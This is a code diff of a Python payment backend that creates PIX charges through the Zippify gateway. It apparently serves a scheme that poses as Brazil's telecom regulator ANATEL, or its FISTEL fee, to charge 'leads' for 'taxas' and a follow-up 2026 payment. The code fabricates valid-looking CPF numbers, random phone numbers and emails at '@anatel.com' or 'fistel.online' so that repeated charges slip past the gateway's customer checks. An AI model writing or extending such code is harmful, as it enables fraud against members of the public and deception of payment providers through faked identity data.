@@ -245,44 +245,41 @@ def validar_cpf(cpf: str) -> bool:
     return True
 
 
-async def zippify_create_pix(valor: float, cnpj: str, nome: str, email: str, phone: str = "11999999999", cpf_especifico: str = None) -> Dict[str, Any]:
+async def zippify_create_pix(valor: float, cpf: str, nome: str, email: str, phone: str = "11999999999", cpf_especifico: str = None) -> Dict[str, Any]:
     """Cria pagamento PIX no Zippify - Gateway Principal
     
     API: https://api.zippify.com.br/api/public/v1/transactions
     Documentação: Zippify Public API v1
     
-    IMPORTANTE: A API Zippify só aceita CPF e trata documentos repetidos como mesmo cliente.
-    Se cpf_especifico for fornecido, usa ele (para segunda cobrança do mesmo cliente).
-    Caso contrário, gera um CPF válido único.
+    Usa o CPF do lead para identificar o cliente no gateway.
     """
     try:
         # Converter valor para centavos (API espera em centavos)
         amount_cents = int(valor * 100)
         
-        # Limpar CNPJ para usar no email
-        cnpj_limpo = cnpj.replace('.', '').replace('/', '').replace('-', '')
-        cnpj_basico = cnpj_limpo[:8] if len(cnpj_limpo) >= 8 else cnpj_limpo
+        # Limpar CPF
+        cpf_limpo = cpf.replace('.', '').replace('-', '')
         
-        # Usar CPF específico se fornecido, senão gerar novo
+        # Usar CPF específico se fornecido, senão usar o CPF do lead
         if cpf_especifico and validar_cpf(cpf_especifico):
             cpf_unico = cpf_especifico
-            logger.info(f"[ZIPPIFY] Usando CPF anterior: {cpf_unico}")
+            logger.info(f"[ZIPPIFY] Usando CPF específico: {cpf_unico}")
+        elif cpf_limpo and len(cpf_limpo) == 11:
+            cpf_unico = cpf_limpo
+            logger.info(f"[ZIPPIFY] Usando CPF do lead: {cpf_unico}")
         else:
             cpf_unico = gerar_cpf_valido()
             logger.info(f"[ZIPPIFY] CPF gerado para transação: {cpf_unico}")
         
-        # Email único usando CNPJ básico (garantir que nunca seja vazio)
-        if cnpj_basico:
-            email_unico = f"{cnpj_basico}@anatel.com"
-        else:
-            import secrets
-            email_unico = f"cliente{secrets.randbelow(999999)}@anatel.com"
+        # Email único usando CPF e domínio fistel.online
+        email_unico = f"{cpf_limpo}@fistel.online"
         
         # Gerar telefone único
         import secrets
         phone_unico = f"119{secrets.randbelow(90000000) + 10000000}"
         
         logger.info(f"[ZIPPIFY] Email: {email_unico}")
+        logger.info(f"[ZIPPIFY] Nome: {nome}")
         
         # Payload conforme documentação Zippify
         payload = {
@@ -290,10 +287,10 @@ async def zippify_create_pix(valor: float, cnpj: str, nome: str, email: str, pho
             "amount": amount_cents,
             "payment_method": "pix",
             "customer": {
-                "name": nome or "Cliente ANATEL",
+                "name": nome or "Cliente FISTEL",
                 "email": email_unico,
                 "phone_number": phone_unico,
-                "document": cpf_unico  # CPF válido
+                "document": cpf_unico  # CPF do lead
             },
             "cart": [
                 {
@@ -308,7 +305,7 @@ async def zippify_create_pix(valor: float, cnpj: str, nome: str, email: str, pho
         }
         
         logger.info(f"[ZIPPIFY] Criando PIX - Valor: R$ {valor:.2f} ({amount_cents} centavos)")
-        logger.info(f"[ZIPPIFY] CPF: {cpf_unico}")
+        logger.info(f"[ZIPPIFY] CPF: {cpf_unico}, Nome: {nome}")
         
         async with httpx.AsyncClient(timeout=60.0) as client:
             response = await client.post(
@@ -802,57 +799,33 @@ async def obter_taxas_anatel(cpf: str):
 async def gerar_pix(data: PagamentoRequest):
     """Gera QR Code PIX usando Zippify (gateway principal)"""
     
-    logger.info(f"[PIX] Gerando via ZIPPIFY - Valor: R$ {data.valor}")
-    if data.cpf_lead:
-        logger.info(f"[PIX] Tentando com CPF do lead: {data.cpf_lead}")
+    logger.info(f"[PIX] Gerando via ZIPPIFY - CPF: {data.cpf}, Nome: {data.nome}, Valor: R$ {data.valor}")
     
-    result = None
-    cpf_usado = data.cpf_lead
-    
-    # Primeira tentativa: usar CPF do lead (se disponível)
-    if data.cpf_lead:
-        try:
-            result = await zippify_create_pix(
-                valor=data.valor,
-                cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
-                nome=data.nome,
-                email=data.email or "contato@contribuinte.com",
-                phone="11999999999",
-                cpf_especifico=data.cpf_lead
-            )
-            logger.info(f"[PIX] Sucesso com CPF do lead: {data.cpf_lead}")
-        except Exception as e:
-            logger.warning(f"[PIX] Erro com CPF do lead ({data.cpf_lead}): {e}")
-            logger.info("[PIX] Tentando com CPF aleatório...")
-            cpf_usado = None  # Forçar uso de CPF aleatório
-    
-    # Segunda tentativa ou única tentativa: CPF aleatório
-    if result is None:
-        try:
-            result = await zippify_create_pix(
-                valor=data.valor,
-                cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
-                nome=data.nome,
-                email=data.email or "contato@contribuinte.com",
-                phone="11999999999",
-                cpf_especifico=None  # Gerar CPF aleatório
-            )
-            logger.info(f"[PIX] Sucesso com CPF aleatório: {result.get('cpf_utilizado')}")
-        except Exception as e:
-            logger.error(f"[PIX] Erro ao gerar PIX: {e}")
-            raise HTTPException(status_code=500, detail=str(e))
+    try:
+        # Usar o CPF do lead diretamente
+        result = await zippify_create_pix(
+            valor=data.valor,
+            cpf=data.cpf,
+            nome=data.nome,
+            email=data.email or "contato@fistel.online",
+            phone="11999999999",
+            cpf_especifico=data.cpf_lead if data.cpf_lead else data.cpf  # Usa CPF do lead ou o próprio CPF
+        )
+        logger.info(f"[PIX] Sucesso! CPF utilizado: {result.get('cpf_utilizado')}")
+    except Exception as e:
+        logger.error(f"[PIX] Erro ao gerar PIX: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
     
     # Salvar transação no MongoDB
     transaction = {
         'id': result['id'],
-        'cpf': data.cpf,  # Alterado de cnpj para cpf
+        'cpf': data.cpf,
         'nome': data.nome,
         'valor': data.valor,
         'qr_code': result['qr_code'],
         'status': result['status'],
         'gateway': result['gateway'],
         'cpf_utilizado': result.get('cpf_utilizado'),
-        'cpf_lead_original': data.cpf_lead,
         'created_at': datetime.now(timezone.utc).isoformat(),
         'updated_at': datetime.now(timezone.utc).isoformat()
     }
@@ -872,15 +845,15 @@ async def gerar_pix(data: PagamentoRequest):
 async def gerar_pix_2026(data: PagamentoRequest2026):
     """Gera QR Code PIX para exercício 2026 usando MESMO CPF do primeiro pagamento"""
     
-    logger.info(f"[PIX 2026] Gerando via ZIPPIFY - Valor: R$ {data.valor} - CPF anterior: {data.cpf_anterior}")
+    logger.info(f"[PIX 2026] Gerando via ZIPPIFY - CPF: {data.cpf}, Nome: {data.nome}, Valor: R$ {data.valor}")
     
     try:
         # Usar Zippify com o MESMO CPF do primeiro pagamento
         result = await zippify_create_pix(
             valor=data.valor,
-            cnpj=data.cpf,  # Usar CPF no lugar de CNPJ
+            cpf=data.cpf,
             nome=data.nome,
-            email=data.email or "contato@contribuinte.com",
+            email=data.email or "contato@fistel.online",
             phone="11999999999",
             cpf_especifico=data.cpf_anterior  # Usar mesmo CPF
         )
